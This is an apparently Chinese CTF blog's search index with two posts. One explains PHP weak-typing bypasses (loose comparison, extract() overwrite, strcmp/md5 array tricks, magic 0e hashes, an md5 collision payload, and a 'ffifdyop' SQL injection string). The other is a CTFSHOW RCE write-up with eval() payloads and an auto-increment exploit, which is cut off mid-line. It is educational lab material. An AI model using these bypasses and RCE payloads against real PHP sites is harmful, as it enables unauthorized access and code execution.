<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP--安全特性</title>
      <link href="/posts/fba9.html"/>
      <url>/posts/fba9.html</url>
      
        <content type="html"><![CDATA[<h1 id="强类型与弱类型"><a href="#强类型与弱类型" class="headerlink" title="强类型与弱类型"></a>强类型与弱类型</h1><p><strong>强类型</strong></p><ul><li><p>所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。J</p></li><li><p>ava、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。</p></li></ul><p><strong>弱类型</strong></p><ul><li>对数据的类型要求并不严格，可以让数据类型互相转换。</li></ul><h2 id="PHP中“-x3D-x3D-”和“-x3D-x3D-x3D-”的区别"><a href="#PHP中“-x3D-x3D-”和“-x3D-x3D-x3D-”的区别" class="headerlink" title="PHP中“&#x3D;&#x3D;”和“&#x3D;&#x3D;&#x3D;”的区别"></a>PHP中“&#x3D;&#x3D;”和“&#x3D;&#x3D;&#x3D;”的区别</h2><p>“&#x3D;&#x3D;”和“&#x3D;&#x3D;&#x3D;”都是用来比较两个数值是否相等的操作符。</p><p>当比较的两个值都是相同类型时候“&#x3D;&#x3D;”和“&#x3D;&#x3D;&#x3D;”是相等的。</p><p>1&#x3D;&#x3D;1（两个int）1.0&#x3D;&#x3D;1.0（两个float）‘H1TerHub’&#x3D;&#x3D;’H1TerHub‘（两个字符串）</p><p><strong>ATTENTION：在前后两个值的类型不一样的时候，‘&#x3D;&#x3D;’会自动转换类型</strong></p><p><img src="https://www.runoob.com/wp-content/uploads/2019/05/xxxxphp.png" alt="img"></p><p>一般看到“&#x3D;&#x3D;”就可以关注是否存在弱类型比较</p><h2 id="“-x3D-x3D-”类型转换的规则"><a href="#“-x3D-x3D-”类型转换的规则" class="headerlink" title="“&#x3D;&#x3D;”类型转换的规则"></a>“&#x3D;&#x3D;”类型转换的规则</h2><p>1、字符串和数字比较，字符串会被转换成数字。</p><p>“admin”&#x3D;&#x3D;0(true)&#x2F;&#x2F;admin被转换成数字，由于admin是字符串，转换失败，int（admin）&#x3D;0，所以比较结果是true。</p><p>2、混合字符串转换成数字，看字符串的第一个。</p><p>“1admin”&#x3D;&#x3D;1 “2admin”&#x3D;&#x3D;2</p><p>3、字符串开头以xex开头，x代表数字。会被转换成科学计数法。</p><p>x*10^x的形式。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">‘2e2’=2*10^2=200</span><br><span class="line">“-2e2”=-2*10^2 “0e2”=0*10^2=0 </span><br><span class="line">“hh-2e2”=0</span><br><span class="line">“1hh-2e2”=1</span><br></pre></td></tr></table></figure><p><img src="https://www.runoob.com/wp-content/uploads/2019/05/1791863413-572055b100304_articlex.png" alt="img"></p><h2 id="bool类型的true跟任意字符串可以弱类型相等"><a href="#bool类型的true跟任意字符串可以弱类型相等" class="headerlink" title="bool类型的true跟任意字符串可以弱类型相等"></a>bool类型的true跟任意字符串可以弱类型相等</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>=“H1TerHub”)&#123;</span><br><span class="line"><span class="keyword">echo</span> “success”;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="应用范例："><a href="#应用范例：" class="headerlink" title="应用范例："></a>应用范例：</h1><h2 id="Is-numeric类型转换缺陷"><a href="#Is-numeric类型转换缺陷" class="headerlink" title="Is_numeric类型转换缺陷"></a>Is_numeric类型转换缺陷</h2><p>PHP提供了is_numeric函数，用来变量判断是否为数字。PHP弱类型语言的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval数字化再比。<br>来看看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">2019</span>)<span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;sorry&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对GET方式提交的参数num的值进行检验。num通过is_numeric函数来判断是否为数字，如果为数字的话，则显示sorry。如果不是数字的话，再和2019进行比较，id的值为2019的时候输出flag。<br>PHP弱类型语言有一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval数字化再比。利用这个特性就可以很好的绕过。</p><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxx&#125;!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract() 函数</p><p>从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。为了拿到flag，需要auth值为1，此处我们利用extract()变量覆盖的缺陷，将auth覆盖为1。</p><h2 id="Strcmp函数的漏洞"><a href="#Strcmp函数的漏洞" class="headerlink" title="Strcmp函数的漏洞"></a>Strcmp函数的漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$password</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxx-xxx-xxxx&#125;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;NO password &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们传入password[]&#x3D;xxx可以绕过<br>是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等</p><h2 id="sha1-md5函数的漏洞"><a href="#sha1-md5函数的漏洞" class="headerlink" title="sha1,md5函数的漏洞"></a>sha1,md5函数的漏洞</h2><p>与strcmp函数类似，sha1、md5也有相同的漏洞。</p><h2 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h2><p>这个原理和之前的“&#x3D;&#x3D;”相似</p><h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于<br><code>$key</code>的值，但是<code>$key</code>的值我们不知道</p><p>这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过</p><p>payload&#x3D;message&#x3D;{“key”,true}</p><h2 id="array-search的漏洞"><a href="#array-search的漏洞" class="headerlink" title="array_search的漏洞"></a>array_search的漏洞</h2><p>array_search() 函数与 <a href="https://link.zhihu.com/?target=http://www.w3school.com.cn/php/func_array_in_array.asp">in_array</a><a href="https://link.zhihu.com/?target=http://www.w3school.com.cn/php/func_array_in_array.asp">()</a> 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;4admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(0)=&gt; 返回键值1</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt;返回键值0</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。</span></span><br></pre></td></tr></table></figure><p>这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。</p><h1 id="md5常见问题及绕过"><a href="#md5常见问题及绕过" class="headerlink" title="md5常见问题及绕过"></a>md5常见问题及绕过</h1><p>在CTF中经常碰见md5相关题目，有的是单独一道，更多的是作为其他题目的一个点。这里整理一下md5相关知识，并给出涉及相关点的题目。</p><h2 id="md5爆破"><a href="#md5爆破" class="headerlink" title="md5爆破"></a>md5爆破</h2><p><code>substr(md5(captcha), -6, 6) == &quot;5bcba3&quot;</code><br>给出md5加密后的几位，可以进行爆破</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)==<span class="string">&quot;5bcba3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=c11750b8-161e-11ed-abf3-fa163e4fa609&task_category_id=3">功防世界-SSRF Me</a><br>这是涉及到该知识点的题目</p><h2 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h2><p>md5弱比较形式：<br><code>if($a != $b &amp;&amp; md5($a) == md5($b))</code><br>这里有两种方法</p><ul><li>0e绕过</li><li>数组绕过</li></ul><p>0e绕过：是md5加密后是0exxxxx的形式，在&#x3D;&#x3D;弱比较时，会被当做科学技术法，众所周知，0的任何次方都是0，自然判断为true<br>大佬整理的<a href="https://github.com/spaze/hashes/blob/master/md5.md">md5加密后0e开头</a></p><p>数组绕过：a[]&#x3D;a&amp;b[]&#x3D;b，传入参数为数组则MD5返回NULL，null&#x3D;null，判断为true，成功绕过</p><h2 id="md5强比较"><a href="#md5强比较" class="headerlink" title="md5强比较"></a>md5强比较</h2><p>md5强比较形式：<br><code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code><br>0e绕过不能用了，因为强比较时，0exxx不再被当做科学计数法，而是被当做字符串。<br>数组绕过仍然可以。</p><h2 id="md5强碰撞"><a href="#md5强碰撞" class="headerlink" title="md5强碰撞"></a>md5强碰撞</h2><p>md5强碰撞形式：<br><code>if((string)$_POST[&#39;a&#39;]!==(string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;])===md5($_POST[&#39;b&#39;]))</code><br>到强碰撞这里，它用string强行转换成字符串，从而限制了数组绕过这方法，只能输入字符串<br>先上payload：</p><blockquote><p>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p></blockquote><p>这一大长串的编码，他们的md5值是相等的，原理是将hex字符串转化为ascii字符串，并写入到bin文件</p><p>考虑到要将一些不可见字符传到服务器，这里使用url编码</p><p><strong>这个是将hex写入到bin文件的python脚本源码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong>这个是将bin文件内容再次url编码的python脚本源码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">urlString1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">urlString2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>):</span><br><span class="line">    urlString1 +=  urllib.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>):</span><br><span class="line">    urlString2 +=  urllib.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> urlString1</span><br><span class="line"><span class="built_in">print</span> urlString2</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">md5强碰撞</a><br>[buu-easy_web](<a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF">https://buuoj.cn/challenges#[安洵杯</a> 2019]easy_web)</p><h2 id="加密后弱相等"><a href="#加密后弱相等" class="headerlink" title="加密后弱相等"></a>加密后弱相等</h2><p>形式如下：<br><code>if ($md5==md5($md5))</code><br>可以找0e开头并且md5后仍然0e开头的字符串，这样0&#x3D;&#x3D;0,就可以绕过了。<br>这里可以用0e215962017。<br><a href="https://buuoj.cn/challenges#[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E">buu-朴实无华</a></p><h2 id="ffifdyop——绕过中一个奇妙的字符串"><a href="#ffifdyop——绕过中一个奇妙的字符串" class="headerlink" title="ffifdyop——绕过中一个奇妙的字符串."></a>ffifdyop——绕过中一个奇妙的字符串.</h2><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><p><code>ffifdyop</code> 这个字符串被 md5 哈希了加密后变成 ：276f722736c95d99e921722cf9ed621c</p><p> Mysql 刚好又会把 hex 转成 ascii 解释：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code></p><p> 而因此拼接之后的形式是select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’</p><p>就相当于select * from admin where password&#x3D;’’or 1 实现sql注入<br>[Easy MD5](<a href="https://buuoj.cn/challenges#[BJDCTF2020]Easy">https://buuoj.cn/challenges#[BJDCTF2020]Easy</a> MD5)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> wb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW RCE极限大挑战</title>
      <link href="/posts/fa99.html"/>
      <url>/posts/fa99.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-RCE极限挑战"><a href="#CTFSHOW-RCE极限挑战" class="headerlink" title="CTFSHOW RCE极限挑战"></a>CTFSHOW RCE极限挑战</h1><h2 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了’(‘和’.’，没过滤反引号，内联绕过。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自增绕过。</p><blockquote><p>fuzz后发现可用的可见字符有：</p><p>! $ ‘ ( ) + , . &#x2F; ; &#x3D; [ ] _</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;;&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line">(<span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>])(<span class="variable">$$__</span>[<span 